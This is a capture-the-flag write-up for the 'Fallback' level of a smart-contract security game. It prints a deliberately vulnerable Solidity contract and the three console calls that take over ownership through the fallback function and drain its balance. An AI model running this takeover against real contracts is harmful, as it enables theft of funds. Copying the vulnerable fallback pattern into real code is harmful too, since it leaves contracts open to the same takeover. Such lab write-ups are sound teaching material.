## Level 01 - Fallback - Write-Up
<!--Authors: OofedUp-->

Difficulty: 1/10

![image](https://i.imgur.com/dz86HHW.png)

## Source
```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

## Solve
In order to claim ownership, I noticed that the fallback function gives it to me:

```javascript
function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

Before we can trigger it, we must call the `contribute` function once, since the fallback function requires us to have contributed before. I will contribute *900000000000000* WEI since it is equivalent to 0.0009 ether, just under the contribution threshold.

```javascript
contract.contribute({value: 900000000000000})
```

So I just send money to the contract, without any function, in order to trigger the fallback function. I could've also called an inexisting function, but since I had the `contract.sendTransaction()` function handy, I used that one:

```javascript
  contract.sendTransaction({value: 1337})
```

Let's check if we have become the owner:

![image](https://i.imgur.com/B20sh8Q.png)

We have! Now all that's left to do is call the `withdraw()` function on the contract and retrieve all the moneyzzz:

```javascript
contract.withdraw()
```

Now we can submit the instance since we solved the challenge.

![image](https://i.imgur.com/qVQ6g2y.png)
